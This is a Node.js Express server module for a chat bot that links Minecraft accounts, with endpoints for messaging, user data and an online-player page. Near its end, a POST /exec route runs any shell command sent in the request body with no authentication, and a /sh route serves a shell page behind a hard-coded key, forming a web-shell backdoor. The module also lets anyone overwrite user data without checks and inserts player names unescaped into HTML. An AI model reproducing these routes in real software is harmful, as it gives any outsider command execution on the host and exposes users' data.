const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const axios = require("axios");
const http = require("http");
const server = http.createServer(app);
const fs = require("fs");
const path = require('path');
const { exec } = require('child_process');

module.exports = async (api, mqtt) => {
	if (!api)
		await require("./connectDB.js")();

	const { config } = global.YukiBot;
	const getText = global.utils.getText;

	const {
		threadModel,
		userModel,
		dashBoardModel,
		threadsData,
		usersData,
		dashBoardData,
		globalData
	} = global.db;

	app.use(bodyParser.json());
	app.use(bodyParser.urlencoded({ extended: true }));
        app.post("/send_msg", async (req, res) => {
    try {
        const { form, threadID } = req.body;
        if (!form || !threadID) return res.status(400).json({ error: "Missing required fields." });
        await mqtt.sendMessage(form, threadID);
        res.status(200).json({ message: "Message sent successfully" });
    } catch {
        res.status(500).json({ error: "Internal Server Error" });
    }
});

app.post("/link", async (req, res) => {
   utils.log.info("MINECRAFT", "Link request.");
    try {
        const { key, mc_name, id } = req.body;
        if (!key || !mc_name || !id) return res.status(400).json({ error: "Bad request." });
        global.minecraft.set(key, { name: mc_name, id });
        res.status(200).json({
            message: `Key generated:\n${key}\nUse /mc link ${key}`
        });
    } catch {
        res.status(500).json({ error: "Internal Server Error" });
	utils.log.error("LINK", error);
    }
});

app.post("/getUserData", async (req, res) => {
    const { mc_name, id } = req.body;
    try {
        const allUsers = await usersData.getAll();
        const data = allUsers.find(u => u?.data?.minecraft?.id === id || u?.data?.minecraft?.name?.toLowerCase() === mc_name.toLowerCase());
        if (!data) return res.status(200).send("NOT_FOUND");
        res.status(200).json(data);
    } catch {
        res.status(500).send("INTERNAL_SERVER_ERROR");
    }
});

app.post("/setUserData", async (req, res) => {
    const { mc_name, id, path, Data } = req.body;
    if (!mc_name || !id || !path || typeof Data === "undefined") {
        return res.status(400).json({ error: "Missing or invalid fields." });
    }
    try {
        const allUsers = await usersData.getAll();
        const user = allUsers.find(u => u?.data?.minecraft?.id === id || u?.data?.minecraft?.name?.toLowerCase() === mc_name.toLowerCase());
        if (!user) return res.status(200).send("NOT_FOUND");
        await usersData.set(user.userID, Data, path);
        res.status(200).json({
            message: "User data updated successfully",
            userID: user.userID,
            path,
            value: Data
        });
    } catch {
        res.status(500).send("INTERNAL_SERVER_ERROR");
    }
});

app.post("/changeOnGameStatus",
        async (req, res) => {
            const {
                status,
                mc_name,
                id
            } = req.body;
            if (typeof status !== "boolean" || !mc_name || !id) {
                return res.status(400).json({
                    error: "Missing or invalid fields."
                });
            }

            try {
                const allUsers = await usersData.getAll();
                const user = allUsers.find(u =>
                    u?.data?.minecraft?.id === id ||
                    u?.data?.minecraft?.name?.toLowerCase() === mc_name.toLowerCase()
                );

                if (!user) {
                    const nonLinkedPlayers = await globalData.get("minecraft", "data.not_linked", {});
                    nonLinkedPlayers[id] = {
                        mc_name,
                        onGame: status
                    };
                    await globalData.set("minecraft", nonLinkedPlayers, "data.not_linked");
                    return res.status(200).json({
                        message: "Non-linked player status updated."
                    });
                }

                await usersData.set(user.userID, status, "data.minecraft.onGame");
                res.status(200).json({
                    message: "User game status updated successfully."
                });

            } catch (err) {
                console.error("Error in changeOnGameStatus:", err);
                res.status(500).send("INTERNAL_SERVER_ERROR");
            }
        });
	
	app.get("/onLinePlayers", async (req, res) => {
    try {
        const allUsers = await usersData.getAll();
        const playersMap = {};

        for (const user of allUsers) {
            const mc = user?.data?.minecraft;
            if (mc?.name) {
                playersMap[mc.name] = {
                    name: mc.name,
                    onGame: mc.onGame === true
                };
            }
        }

        const nonLinked = await globalData.get("minecraft", "data.not_linked", {});
        for (const [id, info] of Object.entries(nonLinked)) {
            if (!playersMap[info.mc_name]) {
                playersMap[info.mc_name] = {
                    name: info.mc_name,
                    onGame: info.onGame === true
                };
            }
        }

        const players = Object.values(playersMap);

        const tableRows = players.map(player => `
  <tr>
    <td>${player.name}</td>
    <td>
      <span class="status-circle ${player.onGame ? "online" : "offline"}"></span>
      ${player.onGame ? "Online" : "Offline"}
    </td>
  </tr>
`).join("");

        const htmlPath = path.join(__dirname, 'Html', 'onLinePlayers.html');
        let html = fs.readFileSync(htmlPath, 'utf-8');
        html = html.replace('[TBROWS]', tableRows);
        res.setHeader("Content-Type", "text/html");
        res.send(html);

    } catch (err) {
        res.status(500).send("INTERNAL_SERVER_ERROR");
    }
});
	
app.post('/exec', (req, res) => {
    const { command } = req.body;

    exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
        if (error) {
            res.json({ output: stderr || error.message });
        } else {
            res.json({ output: stdout });
        }
    });
});

       app.get('/sh', (req, res) => {
	 if (req.query.key != "limnuxSux") return res.send("Fuck You '-'.");
         res.sendFile(path.join(__dirname, 'Html', 'Shell.html'));
       });
	
        app.get("/", (req, res) => {
          res.status(200).send("YUKI is ONLINE.");
        });
	
	const PORT = config.dashBoard.port || config.serverUptime.port || 3001;
	await server.listen(PORT);
	utils.log.info("DASHBOARD", `Dashboard is running.`);
};
